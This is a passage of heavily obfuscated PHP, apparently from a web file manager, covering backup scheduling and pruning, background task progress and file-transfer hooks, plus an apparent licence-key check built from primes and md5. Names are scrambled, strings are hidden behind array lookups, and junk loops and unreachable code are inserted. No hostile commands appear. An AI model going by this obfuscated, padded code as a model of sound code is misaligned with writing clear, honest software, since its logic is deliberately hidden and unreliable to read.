{ return; } while ($ç“Áíª % $ÏËÂº‘Ë != 0) { $êÌİ·™ = $ç“Áíª; $ğÖ‡›„„ = $Ÿ‰ãÆ [812]; if (!$ğÖ‡›„„) { return; } $ç“Áíª = $ÏËÂº‘Ë; $ıÜàïÖÅ = $Ÿ‰ãÆ [813]; while (strlen($ıÜàïÖÅ) < $Ÿ‰ãÆ [680]) { if (!$ıÜàïÖÅ) { break; } $ıÜàïÖÅ++; } $ÏËÂº‘Ë = $êÌİ·™ % $ÏËÂº‘Ë; $çå‚×Å = $Ÿ‰ãÆ [814]; } if ($ÏËÂº‘Ë == 1) { break; } else { $ùîµÁœ½++; } } $¦¶äÔ¹ú = 2; for ($ÜåÃÖç£ = 0; $ÜåÃÖç£ < $æ ©Òå¬ * 10; $ÜåÃÖç£++) { if (($æ ©Òå¬ * $ÜåÃÖç£ + 1) % $ùîµÁœ½ == 0) { $¦¶äÔ¹ú = intval(($æ ©Òå¬ * $ÜåÃÖç£ + 1) / $ùîµÁœ½); break; } } $åê×›Äò = md5($†¸‰ŒîÚ[304] . ($¯‰˜Ş÷ + $—·Üá€) . $†¸‰ŒîÚ[305] . $ùîµÁœ½ . $†¸‰ŒîÚ[305] . $¦¶äÔ¹ú . $†¸‰ŒîÚ[306]); $Å•çşŠ® = $Ÿ‰ãÆ [815]; $ˆıä©â = $this->isvyc724889c($Ñ¾Õº–ó[0], $åê×›Äò); return $ˆıä©â; } public function ipek0934b59c() { $ªÛ¯ªé =& $_SERVER[¦»×‡Ãã]; $‡Õ¶‚ó¨ = mt_rand(pow(2, 14), pow(2, 16) - 1); $´àÇÒ¡… = array(); $ôÁñ ƒ = 1; while ($ôÁñ ƒ <= (int) sqrt($‡Õ¶‚ó¨)) { $òÇ¾úæ  = $ôÁñ ƒ; $¿ŒÒ¶÷ï = $ªÛ¯ªé[816]; while ($¿ŒÒ¶÷ï < $ªÛ¯ªé[684]) { if ($¿ŒÒ¶÷ï >= 0) { break; } $¿ŒÒ¶÷ï++; } while (!0) { $òÇ¾úæ ++; $ÛÔÁšˆá = $ªÛ¯ªé[817]; while (strlen($ÛÔÁšˆá) < $ªÛ¯ªé[690]) { if (!$ÛÔÁšˆá) { break; } $ÛÔÁšˆá++; } if ($òÇ¾úæ  <= 2) { $ôÁñ ƒ = $òÇ¾úæ ; break; } else { if ($òÇ¾úæ  < 2) { continue; } } $òêŸÀæ = !0; for ($…®È¹Œ = 2; $…®È¹Œ <= sqrt($òÇ¾úæ ); $…®È¹Œ++) { if ($òÇ¾úæ  % $…®È¹Œ == 0) { $òêŸÀæ = !1; } } if ($òêŸÀæ) { $ôÁñ ƒ = $òÇ¾úæ ; break; } } $´àÇÒ¡…[] = $ôÁñ ƒ; $ª×øç‘„ = $ªÛ¯ªé[818]; if (strlen($ª×øç‘„) < $ªÛ¯ªé[680]) { die; } } $¡ÊêøÔç = 2; for ($òÇ¾úæ  = $‡Õ¶‚ó¨; $òÇ¾úæ  > 1; $òÇ¾úæ --) { $òêŸÀæ = !0; foreach ($´àÇÒ¡… as $ø‹¢à©Ö) { if ($òÇ¾úæ  % $ø‹¢à©Ö == 0) { $òêŸÀæ = !1; break; } } if ($òêŸÀæ) { $¡ÊêøÔç = $òÇ¾úæ ; break; } } return $¡ÊêøÔç; } public function tugb3fc47667($âÓ¼‹Òó, $Ø”îÈšó) { $ªïëé™ñ =& $_SERVER[¦»×‡Ãã]; $Ìü™‚‘é =& $_SERVER[šÜÉ²œ]; return call_user_func(array($Ìü™‚‘é[8], $Ìü™‚‘é[308]), $âÓ¼‹Òó, $Ø”îÈšó); $á´§¹ñ¤ = $ªïëé™ñ[819]; if (strlen($á´§¹ñ¤) < $ªïëé™ñ[684]) { return; } } public function vidyceeff10d($ óå‰ÙÀ, $™âÁ›Ğò) { $°ÃŠŒ¼ =& $_SERVER[šÜÉ²œ]; return call_user_func(array($°ÃŠŒ¼[309], $°ÃŠŒ¼[310]), $ óå‰ÙÀ, $™âÁ›Ğò); } public function isvyc724889c($ÁÔ¸½Ûø, $ôÖÊôàš) { $âÑÊ÷ß§ =& $_SERVER[šÜÉ²œ]; return call_user_func(array($âÑÊ÷ß§[309], $âÑÊ÷ß§[311]), $ÁÔ¸½Ûø, $ôÖÊôàš); $ÔË“®µ = $_SERVER[¦»×‡Ãã][820]; } } class Backup { protected static $name; protected static $option; protected static $manual; public function __construct() { $this->model = Model($_SERVER[¦»×‡Ãã][821]); $this->init(); $this->keep(); } public function init() { $¡¿¬ƒö¨ =& $_SERVER[¦»×‡Ãã]; $this->isManual(); self::$name = date($¡¿¬ƒö¨[822]); if (!($Ì¥ï±º‰ = $this->model->lastItem())) { $Ì¥ï±º‰ = $this->initData(); } else { self::$name = $Ì¥ï±º‰[$¡¿¬ƒö¨[32]]; if ($Ì¥ï±º‰[$¡¿¬ƒö¨[823]] == $¡¿¬ƒö¨[91]) { self::$name = date($¡¿¬ƒö¨[272]); $şô’¼¾´ = intval(_get($Ì¥ï±º‰, $¡¿¬ƒö¨[824], 0)); if (self::$manual == 0 && $Ì¥ï±º‰[$¡¿¬ƒö¨[32]] == self::$name) { $this->model->remove($Ì¥ï±º‰[$¡¿¬ƒö¨[475]]); } $Ì¥ï±º‰ = $this->initData($şô’¼¾´, $Ì¥ï±º‰[$¡¿¬ƒö¨[825]]); } else { $this->checkStore($Ì¥ï±º‰[$¡¿¬ƒö¨[825]]); } } self::$option = $Ì¥ï±º‰; } private function isManual() { $ãàïÀÇ  = _get($GLOBALS, $_SERVER[¦»×‡Ãã][826], 0); $ãàïÀÇ  = intval($ãàïÀÇ ); self::$manual = $ãàïÀÇ  && $ãàïÀÇ  == 1 ? 1 : 0; } private function initData($äĞà—Áñ = 0, $‡¯ÍÙİè = '') { $†³Æ‚Ôª =& $_SERVER[¦»×‡Ãã]; $¡ú¶©şÆ = $this->model->config(); if ($‡¯ÍÙİè && $¡ú¶©şÆ[$†³Æ‚Ôª[825]] != $‡¯ÍÙİè) { $äĞà—Áñ = 0; } $this->checkStore($¡ú¶©şÆ[$†³Æ‚Ôª[825]]); if (self::$manual == 1) { self::$name .= $†³Æ‚Ôª[11] . date($†³Æ‚Ôª[827]); } $°¹©ÍÉï = array($†³Æ‚Ôª[825] => $¡ú¶©şÆ[$†³Æ‚Ôª[825]], $†³Æ‚Ôª[32] => self::$name, $†³Æ‚Ôª[823] => 0, $†³Æ‚Ôª[171] => $¡ú¶©şÆ[$†³Æ‚Ôª[171]], $†³Æ‚Ôª[828] => self::$manual, $†³Æ‚Ôª[369] => array($†³Æ‚Ôª[829] => array($†³Æ‚Ôª[823] => 0), $†³Æ‚Ôª[830] => array($†³Æ‚Ôª[823] => 0, $†³Æ‚Ôª[831] => 0, $†³Æ‚Ôª[832] => 0, $†³Æ‚Ôª[33] => $†³Æ‚Ôª[12], $†³Æ‚Ôª[833] => 0, $†³Æ‚Ôª[834] => 0), $†³Æ‚Ôª[835] => array($†³Æ‚Ôª[823] => 0, $†³Æ‚Ôª[831] => 0, $†³Æ‚Ôª[832] => 0, $†³Æ‚Ôª[833] => 0, $†³Æ‚Ôª[834] => 0), $†³Æ‚Ôª[230] => array($†³Æ‚Ôª[823] => 0, $†³Æ‚Ôª[836] => 0, $†³Æ‚Ôª[837] => 0, $†³Æ‚Ôª[838] => 0, $†³Æ‚Ôª[839] => 0, $†³Æ‚Ôª[541] => $äĞà—Áñ, $†³Æ‚Ôª[833] => 0, $†³Æ‚Ôª[834] => 0)), $†³Æ‚Ôª[833] => time(), $†³Æ‚Ôª[834] => 0); $İø¤–€Æ = $this->model->insert($°¹©ÍÉï); $°¹©ÍÉï[$†³Æ‚Ôª[475]] = $İø¤–€Æ; return $°¹©ÍÉï; } private function checkStore($ÛÁñÉû³) { $»Íêî‡² = Model($_SERVER[¦»×‡Ãã][840]); $Ûœ¨³ªò = $»Íêî‡²->listData($ÛÁñÉû³); $»Íêî‡²->checkConfig($Ûœ¨³ªò); } public static function get() { if (!self::$option) { $¼‹¡€Î¢ = Model($_SERVER[¦»×‡Ãã][821]); $’ã¦ë³® = $¼‹¡€Î¢->findByName(self::$name); $¼‹¡€Î¢->parseContent($’ã¦ë³®); self::$option = $’ã¦ë³®; } return self::$option; } public static function set($“ê›“ˆğ) { $íı¢¡ =& $_SERVER[¦»×‡Ãã]; $Éáûˆğñ = self::get(); foreach ($“ê›“ˆğ as $«ÉªÈò => $¡°¤¥ˆˆ) { array_set_value($Éáûˆğñ, $«ÉªÈò, $¡°¤¥ˆˆ); } Model($íı¢¡[821])->update($Éáûˆğñ[$íı¢¡[475]], $Éáûˆğñ); self::$option = $Éáûˆğñ; return self::$option; } public function keep() { $± ÔÍÅù =& $_SERVER[¦»×‡Ãã]; $Éí Ûæ = self::get(); if (_get($Éí Ûæ, $± ÔÍÅù[841], 0) == $± ÔÍÅù[91]) { return; } $this->backupKeep($Éí Ûæ); self::set(array($± ÔÍÅù[841] => 1)); } private function backupKeep($·‡™é‘Á) { $Ê¡…Êò¦ =& $_SERVER[¦»×‡Ãã]; if (self::$manual == 1) { return; } $âí½Üİ  = $this->model->listData(); if (empty($âí½Üİ )) { return; } $‡Ê…áµÕ = 0; $„™´ãı® = array(); foreach ($âí½Üİ  as $Â…µÚğê) { if ($‡Ê…áµÕ >= 7) { break; } $„™´ãı®[] = $Â…µÚğê[$Ê¡…Êò¦[32]]; $‡Ê…áµÕ++; } for ($‡Ê…áµÕ = 0; $‡Ê…áµÕ < 12; $‡Ê…áµÕ++) { $„™´ãı®[] = date($Ê¡…Êò¦[842], strtotime("\x2d{$‡Ê…áµÕ}\40\155\x6f\x6e\164\x68\163")); } $„™´ãı® = array_unique($„™´ãı®); $Æê’ô„ª = Model($Ê¡…Êò¦[843])->get($Ê¡…Êò¦[844]); foreach ($âí½Üİ  as $Â…µÚğê) { if (isset($Â…µÚğê[$Ê¡…Êò¦[828]]) && $Â…µÚğê[$Ê¡…Êò¦[828]] == $Ê¡…Êò¦[91]) { continue; } if (!empty($Â…µÚğê[$Ê¡…Êò¦[32]]) && in_array($Â…µÚğê[$Ê¡…Êò¦[32]], $„™´ãı®)) { continue; } $this->model->remove($Â…µÚğê[$Ê¡…Êò¦[475]]); $“ğï¦¯ = $this->backupPath($·‡™é‘Á, $Æê’ô„ª); IO::remove($“ğï¦¯, !1); } } private function backupPath($Ã¨ÑÎÑø, $ğ¥ÄÓß¹ = false) { $‚‡™ó =& $_SERVER[¦»×‡Ãã]; if (!$ğ¥ÄÓß¹) { $ğ¥ÄÓß¹ = Model($‚‡™ó[843])->get($‚‡™ó[844]); } $½¹Õ´ÖÙ = $Ã¨ÑÎÑø[$‚‡™ó[32]]; $ÑåÈ–ûÔ = substr(md5($‚‡™ó[845] . $ğ¥ÄÓß¹ . $½¹Õ´ÖÙ), 0, 8); return "\173\x69\x6f\x3a{$Ã¨ÑÎÑø[$‚‡™ó[825]]}\175\x2f\144\141\x74\x61\142\x61\x73\145\57\x62\141\143\x6b\x75\x70\x2f" . $½¹Õ´ÖÙ . $‚‡™ó[11] . $ÑåÈ–ûÔ; } public function db() { $»ä³¡®ª =& $_SERVER[¦»×‡Ãã]; $×ÊÓ…Š€ = self::get(); if (_get($×ÊÓ…Š€, $»ä³¡®ª[846], 0) == $»ä³¡®ª[91]) { return !0; } $š©ë€×ñ = new BackupDb(); if (!$š©ë€×ñ->index()) { return !1; } self::set(array($»ä³¡®ª[846] => 1)); return !0; } public function dbFile() { $Ü†ÚÆÎî =& $_SERVER[¦»×‡Ãã]; $È‚ÀİÃå = self::get(); if (_get($È‚ÀİÃå, $Ü†ÚÆÎî[847], 0) == $Ü†ÚÆÎî[91]) { return !0; } $ÊÙçÖŞß = new BackupDbFile(); if (!$ÊÙçÖŞß->index()) { return !1; } self::set(array($Ü†ÚÆÎî[847] => 1)); return !0; } public function file() { $âİ¥ïÊà =& $_SERVER[¦»×‡Ãã]; $ƒÌ€½‚ = self::get(); if (_get($ƒÌ€½‚, $âİ¥ïÊà[848], 0) == $âİ¥ïÊà[91]) { return !0; } if ($ƒÌ€½‚[$âİ¥ïÊà[171]] == $âİ¥ïÊà[849]) { $¦°šÌ½¡ = new BackupFile(); if (!$¦°šÌ½¡->index()) { return !1; } } self::set(array($âİ¥ïÊà[848] => 1, $âİ¥ïÊà[823] => 1)); return !0; } } goto C²£«×ƒ •; CííÖÅ‡½¼: class Task { const STATYS_STOP = "\163\x74\x6f\160"; const STATYS_RUNNING = "\162\x75\156\156\x69\156\147"; const STATYS_KILL = "\x6b\151\x6c\154"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($Œâ²êÇ‘, $ÏÑ¡”— = '', $ãà³Ğ™œ = 0, $ïÀÓíç“ = '') { $Š•ïÈ² =& $_SERVER[¦»×‡Ãã]; if (self::get($Œâ²êÇ‘)) { return; } $this->task = array($Š•ïÈ²[475] => $Œâ²êÇ‘, $Š•ïÈ²[1772] => USER_ID, $Š•ïÈ²[1661] => $ïÀÓíç“, $Š•ïÈ²[526] => $Š•ïÈ²[12], $Š•ïÈ²[33] => $ÏÑ¡”—, $Š•ïÈ²[1143] => $Š•ïÈ²[12], $Š•ïÈ²[1141] => $ãà³Ğ™œ, $Š•ïÈ²[1773] => 0, $Š•ïÈ²[1774] => 0, $Š•ïÈ²[1775] => 0, $Š•ïÈ²[1776] => timeFloat(), $Š•ïÈ²[1777] => 0, $Š•ïÈ²[1778] => 0, $Š•ïÈ²[1779] => 0, $Š•ïÈ²[1780] => 0, $Š•ïÈ²[823] => $Š•ïÈ²[1722]); $GLOBALS[$Š•ïÈ²[1781]] = 1; Hook::bind($Š•ïÈ²[1726], array($this, $Š•ïÈ²[1782])); Hook::bind($Š•ïÈ²[1783], array($this, $Š•ïÈ²[1784])); $this->startAfter(); Hook::trigger($Š•ïÈ²[1785], $this->task); $this->task[$Š•ïÈ²[1778]] = timeFloat(); } public function end($Ï‡ÖùÀà = '') { $§¼—¡Èé =& $_SERVER[¦»×‡Ãã]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$§¼—¡Èé[1778]]) { self::valueSet($this->task[$§¼—¡Èé[475]], !1); } $this->isEnd = !0; if ($Ï‡ÖùÀà) { $this->task[$§¼—¡Èé[526]] = $Ï‡ÖùÀà; } self::log($§¼—¡Èé[1786] . $this->task[$§¼—¡Èé[475]] . $§¼—¡Èé[1787] . sprintf($§¼—¡Èé[923], timeFloat() - $this->task[$§¼—¡Èé[1776]]) . $§¼—¡Èé[1788]); Hook::unbind($§¼—¡Èé[1726], array($this, $§¼—¡Èé[1782])); Hook::unbind($§¼—¡Èé[1783], array($this, $§¼—¡Èé[1784])); $this->endAfter(); $Š†Èúï‡ = $this->task; $this->task = !1; Hook::trigger($§¼—¡Èé[1789], $Š†Èúï‡); } public function update($“ğèàãÅ = 0, $ò‚¯ûòï = false) { $Ô”Ãµ•« =& $_SERVER[¦»×‡Ãã]; $€­ÆÔõ =& $this->task; if (!$€­ÆÔõ) { return; } $€­ÆÔõ[$Ô”Ãµ•«[1773]] += $“ğèàãÅ; $€­ÆÔõ[$Ô”Ãµ•«[1777]] = timeFloat(); if ($€­ÆÔõ[$Ô”Ãµ•«[1141]]) { if ($€­ÆÔõ[$Ô”Ãµ•«[1141]] < $€­ÆÔõ[$Ô”Ãµ•«[1773]]) { $€­ÆÔõ[$Ô”Ãµ•«[1141]] = $€­ÆÔõ[$Ô”Ãµ•«[1773]]; } $øŠş„ŸÊ = timeFloat() - $€­ÆÔõ[$Ô”Ãµ•«[1776]] - $€­ÆÔõ[$Ô”Ãµ•«[1779]]; if ($øŠş„ŸÊ <= 0) { $øŠş„ŸÊ = 0.001; } $€­ÆÔõ[$Ô”Ãµ•«[1774]] = $€­ÆÔõ[$Ô”Ãµ•«[1773]] / $€­ÆÔõ[$Ô”Ãµ•«[1141]]; $€­ÆÔõ[$Ô”Ãµ•«[1775]] = $€­ÆÔõ[$Ô”Ãµ•«[1773]] / $øŠş„ŸÊ; if ($€­ÆÔõ[$Ô”Ãµ•«[1774]] > 0) { $€­ÆÔõ[$Ô”Ãµ•«[1780]] = $øŠş„ŸÊ * (1 - $€­ÆÔõ[$Ô”Ãµ•«[1774]]) / $€­ÆÔõ[$Ô”Ãµ•«[1774]]; } $€­ÆÔõ[$Ô”Ãµ•«[1780]] = $€­ÆÔõ[$Ô”Ãµ•«[1780]] <= 0 ? 0 : $€­ÆÔõ[$Ô”Ãµ•«[1780]]; } $this->updateAfter(); $í§ÈÎ¬ = 0.2; if (timeFloat() - $€­ÆÔõ[$Ô”Ãµ•«[1778]] < $í§ÈÎ¬ && !$ò‚¯ûòï) { return; } $çÚõıÁ = self::get($€­ÆÔõ[$Ô”Ãµ•«[475]]); $³À´å§ = $çÚõıÁ[$Ô”Ãµ•«[823]]; if ($³À´å§ == self::STATYS_KILL) { $Ïø¹Óı· = array($Ô”Ãµ•«[1790] => LNG($Ô”Ãµ•«[1791]), $Ô”Ãµ•«[1297] => !1); Cache::set($Ô”Ãµ•«[1792] . $this->task[$Ô”Ãµ•«[475]], $Ïø¹Óı·, 30); $this->onKill(); $this->end(); die; } else { if ($³À´å§ == self::STATYS_STOP) { $õ®Ëã¥ù = 2; $çÚõıÁ[$Ô”Ãµ•«[1779]] += $õ®Ëã¥ù; self::valueSet($€­ÆÔõ[$Ô”Ãµ•«[475]], $çÚõıÁ); sleep($õ®Ëã¥ù); $this->update(); return; } } $€­ÆÔõ[$Ô”Ãµ•«[823]] = $³À´å§ ? $³À´å§ : $€­ÆÔõ[$Ô”Ãµ•«[823]]; $€­ÆÔõ[$Ô”Ãµ•«[1779]] = $çÚõıÁ[$Ô”Ãµ•«[1779]] ? $çÚõıÁ[$Ô”Ãµ•«[1779]] : 0; $€­ÆÔõ[$Ô”Ãµ•«[1778]] = timeFloat(); Hook::trigger($Ô”Ãµ•«[1793], $€­ÆÔõ); self::valueSet($€­ÆÔõ[$Ô”Ãµ•«[475]], $€­ÆÔõ); } public function onKillSet($êÓ°ò’µ, $°ì´††¼ = array()) { $this->onKillCall = array($êÓ°ò’µ, $°ì´††¼); } public function onKill() { $Ÿ¸ã€· =& $_SERVER[¦»×‡Ãã]; self::log($Ÿ¸ã€·[1786] . $this->task[$Ÿ¸ã€·[475]] . $Ÿ¸ã€·[1794]); Hook::trigger($Ÿ¸ã€·[1795], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ê€ïÔŠï) { $ªŸÍœç© =& $_SERVER[¦»×‡Ãã]; Cache::set($ªŸÍœç©[1792] . $this->task[$ªŸÍœç©[475]], $ê€ïÔŠï, 60); return $ê€ïÔŠï; } public static function get($‘õ¸ğÁ›) { $‹®”ô°‰ =& $_SERVER[¦»×‡Ãã]; $åğ‰–€ê = self::valueGet($‘õ¸ğÁ›); if (is_array($åğ‰–€ê) && $åğ‰–€ê[$‹®”ô°‰[1796]]) { $›ôûú¨ = ActionApply($åğ‰–€ê[$‹®”ô°‰[1796]], array($åğ‰–€ê)); $åğ‰–€ê = is_array($›ôûú¨) ? $›ôûú¨ : $åğ‰–€ê; } return $åğ‰–€ê; } public static function listData() { $ãÊ´”Ãà = self::valueGet(); return array_sort_by($ãÊ´”Ãà, $_SERVER[¦»×‡Ãã][1776], !0); } public static function kill($æÆ¸Œ³) { return self::changeStatus($æÆ¸Œ³, self::STATYS_KILL); } public static function stop($–µÏ´²) { return self::changeStatus($–µÏ´², self::STATYS_STOP); } public static function restart($³Œöäˆ’) { return self::changeStatus($³Œöäˆ’, self::STATYS_RUNNING); } public static function killAll() { $¡˜Ğ¶Ãú =& $_SERVER[¦»×‡Ãã]; $¤¢¬ÁÌ… = self::listData(); foreach ($¤¢¬ÁÌ… as $ÒÜÇş…×) { self::kill($ÒÜÇş…×[$¡˜Ğ¶Ãú[475]]); } sleep(2); foreach ($¤¢¬ÁÌ… as $ÒÜÇş…×) { self::valueSet($ÒÜÇş…×[$¡˜Ğ¶Ãú[475]], !1); } } private static function changeStatus($ş‚õªø‰, $Û’¹£¯É) { $ß·ñ©Şç =& $_SERVER[¦»×‡Ãã]; $ä¸ßõ¶¼ = self::valueGet($ş‚õªø‰); if (!$ä¸ßõ¶¼) { return !1; } $ä¸ßõ¶¼[$ß·ñ©Şç[823]] = $Û’¹£¯É; self::valueSet($ş‚õªø‰, $ä¸ßõ¶¼); self::log($ß·ñ©Şç[1797] . $ä¸ßõ¶¼[$ß·ñ©Şç[475]] . $ß·ñ©Şç[1798] . $Û’¹£¯É); return !0; } public static function valueGet($®ŠØ÷©” = false) { $†¤ÊáŠÔ =& $_SERVER[¦»×‡Ãã]; if ($®ŠØ÷©”) { $°°¨‰¨ = Model($†¤ÊáŠÔ[520])->where(array($†¤ÊáŠÔ[97] => $®ŠØ÷©”, $†¤ÊáŠÔ[33] => $†¤ÊáŠÔ[1150]))->find(); return $°°¨‰¨ ? json_decode($°°¨‰¨[$†¤ÊáŠÔ[450]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Õğ˜éá = false) { $Š…ÒàÖÃ =& $_SERVER[¦»×‡Ãã]; $ˆÜ­‚¡ = array($Š…ÒàÖÃ[33] => $Š…ÒàÖÃ[1150]); if ($Õğ˜éá) { $ˆÜ­‚¡[$Š…ÒàÖÃ[1772]] = $Õğ˜éá; } $€Êñä‡œ = Model($Š…ÒàÖÃ[520])->where($ˆÜ­‚¡)->select(); $€Êñä‡œ = $€Êñä‡œ ? $€Êñä‡œ : array(); foreach ($€Êñä‡œ as $ìØÇ‹£‘ => $ğÊ¥±©é) { $€Êñä‡œ[$ìØÇ‹£‘] = json_decode($ğÊ¥±©é[$Š…ÒàÖÃ[450]], !0); } return $€Êñä‡œ; } public static function valueSet($»îĞÌ³Í, $ÇØ™Æ ©) { $¸İÛ›º¼ =& $_SERVER[¦»×‡Ãã]; if (!$ÇØ™Æ ©) { return Model($¸İÛ›º¼[520])->where(array($¸İÛ›º¼[97] => $»îĞÌ³Í, $¸İÛ›º¼[33] => $¸İÛ›º¼[1150]))->delete(); } $ùÕäí¶Ğ = json_encode($ÇØ™Æ ©); if (!$ùÕäí¶Ğ) { ob_start(); var_dump($ÇØ™Æ ©); $½¼³î = ob_get_clean(); self::log($¸İÛ›º¼[1799] . json_encode_force($½¼³î)); } if (!$»îĞÌ³Í || !$ÇØ™Æ ©[$¸İÛ›º¼[475]]) { return !1; } $’õ€ÕßÊ = array($¸İÛ›º¼[33] => $¸İÛ›º¼[1150], $¸İÛ›º¼[1772] => USER_ID, $¸İÛ›º¼[97] => $»îĞÌ³Í, $¸İÛ›º¼[450] => $ùÕäí¶Ğ); $İÓÇÔé¼ = $¸İÛ›º¼[1800]; CacheLock::lock($İÓÇÔé¼); Model($¸İÛ›º¼[520])->add($’õ€ÕßÊ, array(), !0); CacheLock::unlock($İÓÇÔé¼); } public static function log($ÜàşäÛ›) { if (!GLOBAL_DEBUG) { return; } write_log($ÜàşäÛ›, $_SERVER[¦»×‡Ãã][1801]); } } class TaskFileTransfer extends Task { protected function startAfter() { $Æû¼çÇé =& $_SERVER[¦»×‡Ãã]; $ëìàŞëå =& $this->task; $this->sourceCopyFolder = !1; Hook::bind($Æû¼çÇé[1802], array($this, $Æû¼çÇé[1803])); Hook::bind($Æû¼çÇé[1308], array($this, $Æû¼çÇé[1804])); Hook::bind($Æû¼çÇé[1805], array($this, $Æû¼çÇé[1806])); Hook::bind($Æû¼çÇé[668], array($this, $Æû¼çÇé[1807])); Hook::bind($Æû¼çÇé[669], array($this, $Æû¼çÇé[1808])); Hook::bind($Æû¼çÇé[675], array($this, $Æû¼çÇé[1809])); Hook::bind($Æû¼çÇé[676], array($this, $Æû¼çÇé[1810])); Hook::bind($Æû¼çÇé[671], array($this, $Æû¼çÇé[1811])); Hook::bind($Æû¼çÇé[673], array($this, $Æû¼çÇé[1812])); Hook::bind($Æû¼çÇé[637], array($this, $Æû¼çÇé[1813])); Hook::bind($Æû¼çÇé[634], array($this, $Æû¼çÇé[1813])); Hook::bind($Æû¼çÇé[639], array($this, $Æû¼çÇé[1813])); Hook::bind($Æû¼çÇé[641], array($this, $Æû¼çÇé[1813])); Hook::bind($Æû¼çÇé[643], array($this, $Æû¼çÇé[1813])); Hook::bind($Æû¼çÇé[1814], array($this, $Æû¼çÇé[1815])); Hook::bind($Æû¼çÇé[659], array($this, $Æû¼çÇé[1816])); $this->sourceModelCopyFlag = !1; Hook::bind($Æû¼çÇé[1817], array($this, $Æû¼çÇé[1818])); Hook::bind($Æû¼çÇé[1819], array($this, $Æû¼çÇé[1820])); Hook::bind($Æû¼çÇé[1821], array($this, $Æû¼çÇé[1822])); $ëìàŞëå[$Æû¼çÇé[1823]] = LNG($Æû¼çÇé[1824]); $ëìàŞëå[$Æû¼çÇé[1825]] = 0; $ëìàŞëå[$Æû¼çÇé[1826]] = 0; $ëìàŞëå[$Æû¼çÇé[1143]] = $Æû¼çÇé[12]; $ëìàŞëå[$Æû¼çÇé[1827]] = $Æû¼çÇé[12]; $ëìàŞëå[$Æû¼çÇé[1828]] = 0; $ëìàŞëå[$Æû¼çÇé[1829]] = 0; $ëìàŞëå[$Æû¼çÇé[1830]] = 0; if (!$ëìàŞëå[$Æû¼çÇé[1661]]) { $ëìàŞëå[$Æû¼çÇé[1661]] = LNG($Æû¼çÇé[1831]); } } protected function endAfter() { $µæñ„Á =& $_SERVER[¦»×‡Ãã]; Hook::unbind($µæñ„Á[1802], array($this, $µæñ„Á[1803])); Hook::unbind($µæñ„Á[1308], array($this, $µæñ„Á[1804])); Hook::unbind($µæñ„Á[1805], array($this, $µæñ„Á[1806])); Hook::unbind($µæñ„Á[668], array($this, $µæñ„Á[1807])); Hook::unbind($µæñ„Á[669], array($this, $µæñ„Á[1808])); Hook::unbind($µæñ„Á[675], array($this, $µæñ„Á[1809])); Hook::unbind($µæñ„Á[676], array($this, $µæñ„Á[1810])); Hook::unbind($µæñ„Á[671], array($this, $µæñ„Á[1811])); Hook::unbind($µæñ„Á[673], array($this, $µæñ„Á[1812])); Hook::unbind($µæñ„Á[637], array($this, $µæñ„Á[1813])); Hook::unbind($µæñ„Á[634], array($this, $µæñ„Á[1813])); Hook::unbind($µæñ„Á[639], array($this, $µæñ„Á[1813])); Hook::unbind($µæñ„Á[641], array($this, $µæñ„Á[1813])); Hook::unbind($µæñ„Á[643], array($this, $µæñ„Á[1813])); Hook::unbind($µæñ„Á[1814], array($this, $µæñ„Á[1815])); Hook::unbind($µæñ„Á[659], array($this, $µæñ„Á[1816])); Hook::unbind($µæñ„Á[1817], array($this, $µæñ„Á[1818])); Hook::unbind($µæñ„Á[1819], array($this, $µæñ„Á[1820])); Hook::unbind($µæñ„Á[1821], array($this, $µæñ„Á[1822])); } public function copyMoveStart($ëå´Í”û, $èÀŠÑÛÛ, $™‚ëÇ´¢, $°ƒ‡‘ì³) { $¬¦§¼áÛ =& $_SERVER[¦»×‡Ãã]; self::log($¬¦§¼áÛ[1832] . $èÀŠÑÛÛ . $¬¦§¼áÛ[73] . $°ƒ‡‘ì³); $ä‰ÉÒ»¯ = rtrim(TEMP_FILES, $¬¦§¼áÛ[8]); if (substr($èÀŠÑÛÛ, 0, strlen($ä‰ÉÒ»¯)) == $ä‰ÉÒ»¯) { return; } if (substr($°ƒ‡‘ì³, 0, strlen($ä‰ÉÒ»¯)) == $ä‰ÉÒ»¯) { return; } $Î‹Ö¬àÁ =& $this->task; $Î‹Ö¬àÁ[$¬¦§¼áÛ[1833]] = KodIO::transferType($ëå´Í”û, $™‚ëÇ´¢); $this->update(); } public function updateAfter() { $ŠÔ‹‹µÄ =& $_SERVER[¦»×‡Ãã]; $×ã°Ê£Ö =& $this->task; if (!$×ã°Ê£Ö[$ŠÔ‹‹µÄ[836]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($×ã°Ê£Ö[$ŠÔ‹‹µÄ[1833]] == $ŠÔ‹‹µÄ[1401]) { return; } self::updateTask($×ã°Ê£Ö); } private static function updateTask(&$­µ¥·¯) { $Üï«Æª’ =& $_SERVER[¦»×‡Ãã]; if ($­µ¥·¯[$Üï«Æª’[1833]] == $Üï«Æª’[1279] || $­µ¥·¯[$Üï«Æª’[1833]] == $Üï«Æª’[110]) { if ($­µ¥·¯[$Üï«Æª’[1827]]) { $­µ¥·¯[$Üï«Æª’[1830]] = $­µ¥·¯[$Üï«Æª’[1829]] + $­µ¥·¯[$Üï«Æª’[1826]]; } } else { if ($­µ¥·¯[$Üï«Æª’[1833]] == $Üï«Æª’[1402]) { if ($­µ¥·¯[$Üï«Æª’[1827]] == $Üï«Æª’[1279]) { $­µ¥·¯[$Üï«Æª’[1830]] = $­µ¥·¯[$Üï«Æª’[1829]] + $­µ¥·¯[$Üï«Æª’[1826]] * 0.5; } else { if ($­µ¥·¯[$Üï«Æª’[1827]] == $Üï«Æª’[110]) { $­µ¥·¯[$Üï«Æª’[1830]] = $­µ¥·¯[$Üï«Æª’[1829]] + $­µ¥·¯[$Üï«Æª’[1825]] * 0.5 + $­µ¥·¯[$Üï«Æª’[1826]] * 0.5; } } } } $­µ¥·¯[$Üï«Æª’[1774]] = $­µ¥·¯[$Üï«Æª’[1830]] / $­µ¥·¯[$Üï«Æª’[836]]; if ($­µ¥·¯[$Üï«Æª’[1774]] > 0) { $½É¢¨¿Š = timeFloat() - $­µ¥·¯[$Üï«Æª’[1776]] - $­µ¥·¯[$Üï«Æª’[1779]]; $­µ¥·¯[$Üï«Æª’[1780]] = $½É¢¨¿Š * (1 - $­µ¥·¯[$Üï«Æª’[1774]]) / 